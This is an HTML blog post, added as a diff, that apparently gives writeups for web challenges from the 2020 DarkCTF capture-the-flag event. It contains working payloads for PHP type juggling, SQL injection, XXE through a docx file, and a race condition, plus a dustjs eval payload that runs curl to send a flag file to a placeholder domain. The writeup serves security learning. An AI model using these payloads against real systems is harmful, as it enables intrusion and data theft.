@@ -1,0 +1,235 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DarkCTF-Writeups - PlayingWithHacks</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="Writeups For all Web Challenges from DarkCTFSource496 solves / 101 pointsAuthor: Mr.Ghost
+In the ch,"> 
+    <meta name="author" content="Captain-K"> 
+    <link rel="alternative" href="atom.xml" title="PlayingWithHacks" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">PlayingWithHacks</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">DarkCTF-Writeups</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">DarkCTF-Writeups</h1>
+        <div class="stuff">
+            <span>September 27, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="Writeups-For-all-Web-Challenges-from-DarkCTF"><a href="#Writeups-For-all-Web-Challenges-from-DarkCTF" class="headerlink" title="Writeups For all Web Challenges from DarkCTF"></a>Writeups For all Web Challenges from DarkCTF</h2><h1 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h1><p><code>496 solves / 101 points</code><br><code>Author: Mr.Ghost</code></p>
+<p>In the challenge we are given the source code for the challenge and there are a few checks we have to bypass to get the flag<br>ie </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$web &#x3D; $_SERVER[&#39;HTTP_USER_AGENT&#39;];</span><br><span class="line">if (is_numeric($web))&#123;</span><br><span class="line">      if (strlen($web) &lt; 4)&#123;</span><br><span class="line">          if ($web &gt; 10000)&#123; echo $flag&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>so for this the input has to be a number &gt;10000 but length less than 4. We can use the exponent syntax for this<br>ie 9e9 which basically gives 9*(10^9)==<code>9000000000</code></p>
+<h1 id="Apache-Logs"><a href="#Apache-Logs" class="headerlink" title="Apache Logs"></a>Apache Logs</h1><pre><code>Read the log file get the url encoded text decode it convert the numbers to ascii representation</code></pre><h1 id="Simple-SQL"><a href="#Simple-SQL" class="headerlink" title="Simple_SQL"></a>Simple_SQL</h1><pre><code>I guess it was suppose to be sql injection but direclty going to ?id=9 gives you the flag (idor)</code></pre><h1 id="So-Simple"><a href="#So-Simple" class="headerlink" title="So_Simple"></a>So_Simple</h1><pre><code>there was a parameter ?id= which we could use to do sql injection and get the flag from the database
+`http://web.darkarmy.xyz:30001/?id=0%27%20union%20select%201,group_concat(password),3%20from%20users%20--%20-`</code></pre><h1 id="PHP-Information"><a href="#PHP-Information" class="headerlink" title="PHP İnformation"></a>PHP İnformation</h1><pre><code>This was basic php code revied and solve challenge
+Part 1.
+        `http://php.darkarmy.xyz:7001/?darkctf=2020`
+Part 2.
+        Change User-Agent to `2020_the_best_year_corona`
+Part 3
+        `?ctf2020=WkdGeWEyTjBaaTB5TURJd0xYZGxZZz09`
+Part 4
+        md5 collision with type juggling 
+        `?karma=240610708&amp;2020=QNKCDZO`</code></pre><h1 id="Agent-U"><a href="#Agent-U" class="headerlink" title="Agent-U"></a>Agent-U</h1><p>Get the database </p>
+<p>if we use admin:admin as credentials the user-agent seems to get inserted into the database so we can exploit the insert clause<br><code>&#39; or updatexml(1, concat(0x7e, (database())), 1), &#39;&#39;,&#39;&#39;) -- -</code></p>
+<h1 id="Dusty-Notes"><a href="#Dusty-Notes" class="headerlink" title="Dusty Notes"></a>Dusty Notes</h1><p>This was related to the <code>dustjs</code> module exploit similar to the one on paytm which causes codeexecution due to unsafe eval<br>we could use the payload<br><code>message[]=x&amp;message[]=y&#39;-require(&#39;child_process&#39;).exec(&#39;curl+-F+&quot;x=</code>cat+/flag<code>&quot;+&lt;yourdomain.com&gt;&#39;-&#39;</code></p>
+<h1 id="Chain-Race"><a href="#Chain-Race" class="headerlink" title="Chain Race"></a>Chain Race</h1><p>This was a lfi-ssrf-racecondition based bug </p>
+<ol>
+<li><p>read /etc/password from there you will find a reference to another service running on the machineat localhost:8080<br>sending a request to <a href="http://localhost:8080" target="_blank" rel="noopener">http://localhost:8080</a> we get its sourc code </p>
+<pre><code>session_start();
+include &apos;flag.php&apos;;
+
+$login_1 = 0;
+$login_2 = 0;
+
+if(!(isset($_GET[&apos;user&apos;]) &amp;&amp; isset($_GET[&apos;secret&apos;]))){
+    highlight_file(&quot;index.php&quot;);
+    die();
+}
+
+$login_1 = strcmp($_GET[&apos;user&apos;], &quot;admin&quot;) ? 1 : 0;
+
+$temp_name = sha1(date(&quot;ms&quot;).@$_COOKIE[&apos;PHPSESSID&apos;]);
+session_destroy();
+if (($_GET[&apos;secret&apos;] == &quot;0x1337&quot;) || $_GET[&apos;user&apos;] == &quot;admin&quot;) {
+    die(&quot;nope&quot;);
+}
+
+if (strcasecmp($_GET[&apos;secret&apos;], &quot;0x1337&quot;) == 0){
+    $login_2 = 1;
+}
+
+file_put_contents($temp_name, &quot;your_fake_flag&quot;);
+
+if ($login_1 &amp;&amp; $login_2) {
+    if (@unlink($temp_name)) {
+        die(&quot;Nope&quot;);
+    }
+echo $flag;
+}
+die(&quot;Nope&quot;);</code></pre><p>Everything seems fine till this part <code>if (@unlink($temp_name))</code> here it basically unlinks the file it created and @unlink($temp_name) has a return value of true/1 if successful<br>so basically we need to make it so that unlink fails . here we can use race condition<br>i wrote a simple multithreading script to send requests simultaneously to the server with the payload<br><code>http://127.0.0.1:8080/?user=Admin&amp;secret[]=0x1337</code><br>and was able to get the flag</p>
+</li>
+</ol>
+<h1 id="File-Reader"><a href="#File-Reader" class="headerlink" title="File Reader"></a>File Reader</h1><p>This was an interesting challenge accordind to me  in the description it said something to do with xml<br>so we started giving xml payloads but the application only accepted pdf and docx files<br>the application takes the file and displays the</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">File Name :</span><br><span class="line">Size:</span><br><span class="line">Mimetype :</span><br><span class="line">Number of pages:</span><br></pre></td></tr></table></figure>
+<p>after learning a bit more i found that .docx can be broken down further and the app.xml is responsible for showing Number of pages<br>so we overwrote the app.xml with our payload </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;flag.txt&#39;&gt; ]&gt;</span><br><span class="line">&lt;Properties xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.openxmlformats.org&#x2F;officeDocument&#x2F;2006&#x2F;extended-properties&quot; xmlns:vt&#x3D;&quot;http:&#x2F;&#x2F;schemas.openxmlformats.org&#x2F;officeDocument&#x2F;2006&#x2F;docPropsVTypes&quot;&gt;&lt;Pages&gt;&amp;xxe;&lt;&#x2F;Pages&gt;&lt;&#x2F;Properties&gt;</span><br></pre></td></tr></table></figure>
+<p>and repackaged the file as .docx and sent it to the server<br>flag -<code>darkCTF{1nj3ct1ng_d0cx_f0r_xx3}</code></p>
+<h1 id="Safe-House"><a href="#Safe-House" class="headerlink" title="Safe_House"></a>Safe_House</h1><p>Another Sql challenge i started of as blind based and one of my teammates figured that error based would be much easier<br><code>http://safehouse.darkarmy.xyz/?xer=&#39; union select%201,2, (select updatexml(null,concat(0x0a,(%20select%20group_concat(referer)%20from referers )),0x0a))-- -</code><br>the flag was in referers table </p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/Captain-K-101'
+        data-o='https://github.com/Captain-K-101'
+        data-a=''
+        data-d='false'
+    >View comments</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
